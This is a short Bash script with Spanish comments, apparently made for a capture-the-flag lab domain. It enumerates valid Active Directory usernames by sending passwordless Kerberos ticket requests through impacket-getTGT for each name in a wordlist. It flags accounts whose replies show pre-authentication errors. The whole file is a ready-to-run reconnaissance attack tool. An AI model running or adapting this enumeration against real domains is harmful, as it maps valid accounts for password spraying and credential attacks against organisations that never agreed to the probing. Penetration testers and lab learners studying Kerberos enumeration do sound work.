#!/bin/bash
# Uso: ./enum_usuarios.sh userlist.txt spookysec.local

if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <archivo_de_usuarios.txt> <dominio>"
    exit 1
fi

USERLIST="$1"
DOMINIO="$2"

while IFS= read -r usuario; do
    echo -ne "Probando usuario: $usuario\r"
    
    salida=$(impacket-getTGT -no-pass ${DOMINIO}/${usuario} 2>&1)
    
    if echo "$salida" | grep -q "KRB5KDC_ERR_PREAUTH_REQUIRED\|SessionKeyDecryptionError"; then
        echo -ne "\r\033[K"
        echo "[+] PREAUTH_REQUIRED - Usuario encontrado: $usuario"
        exit 0
    fi
done < "$USERLIST"

echo -ne "\r\033[K"
echo "No se encontró ningún usuario válido."
exit 1
